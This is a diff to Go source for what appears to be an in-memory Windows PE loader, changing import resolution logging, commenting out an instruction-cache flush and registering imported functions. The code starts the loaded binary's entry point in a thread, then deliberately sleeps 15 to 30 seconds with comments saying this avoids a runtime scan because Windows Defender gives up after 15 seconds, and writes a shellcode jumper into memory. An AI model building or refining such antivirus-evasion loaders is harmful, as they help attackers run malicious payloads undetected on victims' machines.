@@ -103,11 +103,12 @@ func LoadFunction(api WinAPI, bin BinAPI, module Module) (err error) {
 			ptrName, funcName = parseFuncAddress(api, bin.GetAddr(), firstThunk.AddressOfData)
 		}
 		funcAddr, _ := api.GetProcAddress(module.Address, ptrName)
-		log.Debugf("Imported function %s at 0x%x", string(funcName), funcAddr)
+		log.Debugf("Imported function %s at 0x%x (%s)", funcName, funcAddr, module.Name)
 		firstThunk.AddressOfData = funcAddr
 
 		offsetFirstThunk += Sizeof(uintptr(0))
 		offsetOriginalfirstThunk += Sizeof(uintptr(0))
+		bin.AddFunction(funcAddr, funcName, &module)
 	}
 	return err
 }
@@ -254,15 +255,14 @@ func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
 
 	entryPoint := bin.GetEntryPoint()
 	log.Infof("Getting entry point %x", entryPoint)
-
-	api.NtFlushInstructionCache(bin.GetAddr(), bin.GetImageBase())
+	//api.NtFlushInstructionCache(bin.GetAddr(), bin.GetImageBase())
 
 	r1, err := api.CreateThread(entryPoint)
 	if err != nil {
 		return err
 	}
 
-	log.Infof("Waiting a few seconds to trip off any runtime scan")
+	log.Infof("Waiting a few seconds to avoid runtime scan")
 	time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
 
 	api.ResumeThread(r1)
@@ -287,6 +287,7 @@ func PrepareJumper(api WinAPI, entryPoint Pointer) (Pointer, error) {
 		return nil, err
 	}
 	api.Memcopy(uintptr(Pointer(&sc[0])), ptrValue(addr), uintptr(len(sc)))
+
 	if err = api.VirtualProtect(ptrValue(addr), 16, true, false); err != nil {
 		return nil, err
 	}
